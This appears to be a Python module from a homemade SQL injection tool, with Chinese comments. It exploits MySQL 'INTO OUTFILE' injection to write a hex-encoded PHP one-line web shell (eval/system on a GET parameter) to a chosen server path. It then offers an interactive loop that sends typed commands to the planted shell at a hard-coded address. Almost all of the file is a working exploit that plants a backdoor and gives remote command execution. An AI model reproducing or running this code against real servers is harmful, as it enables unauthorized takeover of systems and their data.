from lib.core.settings import BOUNDARIES_FILE_NAME
from lib.core.settings import DATA_FILE_NAME
from lib.core.settings import ERROR_FILE_NAME
from data.json_file import get_json
import random
import string
from lib.utils.cache import Cache
from lib.core.settings import SQLITE_FILE_NAME

class CheckShell():
    def __init__(self, urls, id, db, top_boundaries, log):
        self.urls = urls
        self.db = db
        self.id = id
        self.log = log
        self.param = self.urls.params[id]
        self.top_boundaries = top_boundaries
        self.boundaries = get_json(BOUNDARIES_FILE_NAME, "low")   
        self.error_payloads = get_json(ERROR_FILE_NAME, self.db)
        self.data_payloads = get_json(DATA_FILE_NAME, self.db)
        self.random_file = ''.join(random.sample(string.ascii_letters + string.digits, 6)) + ".php"

    def write_shell(self):
        '''
        写入一句话木马
        '''
        path = self.path + self.random_file
        payload = "OR 6684=6684 LIMIT 0,1 INTO OUTFILE'"+path+"' LINES TERMINATED BY 0x3C3F706870206563686F20406576616C2873797374656D28245F4745545B27797379275D29293B3F3E"
        url = self.urls.http_payload(self.param, payload, self.top_boundaries)
        self.urls.http_request(url)

    def shell_input(self, cmd):
        '''
        输入命令,执行shell
        '''
        url = "http://192.168.45.144:81/" + self.random_file + "?ysy=" + cmd
        # print(url)
        result = self.urls.http_request(url).text
        result = result.replace("1	Dumb	Dumb","")
        return result

    def shell_ui(self):
        '''
        模拟shell的ui
        '''
        choose = input("是否要反弹webshell:(y)yes; (n)no：")
        if choose == 'y':
            self.path = input("请输入绝对路径:")
            self.write_shell()
            self.log.info("成功反弹webshell")
            while True:  ##形成死循环，形成一个shell环境
                cmd = input("[mysql-webshell]>> ")
                if cmd:  ##判断是否有输入，有为真，没有为假
                    if cmd == 'exit':
                        self.shell_input("del " + self.random_file)
                        self.log.info("成功退出")
                        break
                    else:
                        print(self.shell_input(cmd))
                else:
                    continue  ##当输入为空时进入死循环
        else:
            self.log.info("成功退出")
            return

    def detected(self):
        '''
        获取shell函数
        '''
        if self.db == "mysql":
            self.shell_ui()
        else:
            return